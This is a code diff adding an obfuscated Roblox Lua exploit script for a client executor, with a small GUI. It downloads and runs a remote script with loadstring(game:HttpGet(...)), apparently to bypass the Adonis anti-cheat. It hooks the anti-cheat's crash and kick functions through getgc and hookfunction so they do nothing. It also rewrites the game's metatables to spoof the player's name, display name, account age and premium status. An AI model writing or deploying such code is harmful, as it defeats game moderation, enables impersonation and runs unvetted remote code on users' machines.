@@ -1,0 +1,137 @@
+local d8k = game:GetService("Players")
+local x3v = d8k.LocalPlayer
+local q7j = x3v.PlayerGui:WaitForChild("Gui by @Surhanman (put in StarterGui)")
+local a2p = q7j:WaitForChild("TextButton")
+local z5r = q7j:WaitForChild("Frame")
+local m9c = z5r:WaitForChild("Exit")
+
+local function v52()
+    local v145 = {"Crash", "HardCrash", "GPUCrash", "RAMCrash", "KillClient", "SetFPS"}
+    
+    for v16, v39 in pairs(getgc()) do 
+        if type(v39) == "function" then
+            local v7 = debug.getinfo(v39)
+            if v7.source and v7.source:find('.Core.Functions') and table.find(v145, v7.name) then
+                hookfunction(v39, function() return end)
+            end
+        end
+    end
+end
+
+local function g4s()
+    local lp = d8k.LocalPlayer
+    local spoofName = "GL1chN00B"
+    local spoofId = lp.UserId
+    
+    local oldNameCall
+    oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
+        local args = {...}
+        local method = getnamecallmethod()
+        
+        if not checkcaller() and method == "GetPlayerByUserId" and args[1] == lp.UserId then
+            return lp
+        end
+        
+        if not checkcaller() and method == "GetPlayerByName" and args[1] == lp.Name then
+            return lp
+        end
+        
+        if not checkcaller() and method == "GetPropertyChangedSignal" and self == lp and (args[1] == "Name" or args[1] == "DisplayName" or args[1] == "UserId") then
+            local fake = Instance.new("BindableEvent")
+            return fake.Event
+        end
+        
+        return oldNameCall(self, ...)
+    end)
+    
+    local mt = getrawmetatable(game)
+    local oldIndex = mt.__index
+    setreadonly(mt, false)
+    
+    mt.__index = newcclosure(function(self, key)
+        if not checkcaller() then
+            if self == lp and key == "Name" then
+                return spoofName
+            end
+            
+            if self == lp and key == "DisplayName" then
+                return spoofName
+            end
+            
+            if self == lp and key == "AccountAge" then
+                return 365 * 3
+            end
+            
+            if self == lp and key == "MembershipType" then
+                return Enum.MembershipType.Premium
+            end
+        end
+        
+        return oldIndex(self, key)
+    end)
+    
+    local oldNewIndex = mt.__newindex
+    mt.__newindex = newcclosure(function(self, key, value)
+        if not checkcaller() and self == lp then
+            if key == "Name" or key == "DisplayName" or key == "UserId" or key == "AccountAge" or key == "MembershipType" then
+                return
+            end
+        end
+        
+        return oldNewIndex(self, key, value)
+    end)
+    
+    setreadonly(mt, true)
+    
+    for _, v in pairs(game:GetDescendants()) do
+        if (v:IsA("TextLabel") or v:IsA("TextButton")) and v.Text == lp.Name then
+            v.Text = spoofName
+        end
+    end
+    
+    game.DescendantAdded:Connect(function(v)
+        if (v:IsA("TextLabel") or v:IsA("TextButton")) and v.Text == lp.Name then
+            v.Text = spoofName
+        end
+    end)
+    
+    for _, v in pairs(lp:GetDescendants()) do
+        if v.Name == "leaderstats" then
+            local clone = v:Clone()
+            v:Destroy()
+            clone.Parent = lp
+        end
+    end
+    
+    if lp.Character and lp.Character:FindFirstChild("Humanoid") then
+        lp.Character.Humanoid.DisplayName = spoofName
+    end
+    
+    lp.CharacterAdded:Connect(function(char)
+        if char:WaitForChild("Humanoid") then
+            char.Humanoid.DisplayName = spoofName
+        end
+    end)
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua"))()
+pcall(v52)
+
+if x3v.Name == "GL1chN00B" then
+    a2p.Visible = true
+    a2p.MouseButton1Click:Connect(function()
+        z5r.Visible = true
+    end)
+    m9c.MouseButton1Click:Connect(function()
+        z5r.Visible = false
+    end)
+else
+    pcall(g4s)
+    a2p.Visible = true
+    a2p.MouseButton1Click:Connect(function()
+        z5r.Visible = true
+    end)
+    m9c.MouseButton1Click:Connect(function()
+        z5r.Visible = false
+    end)
+end
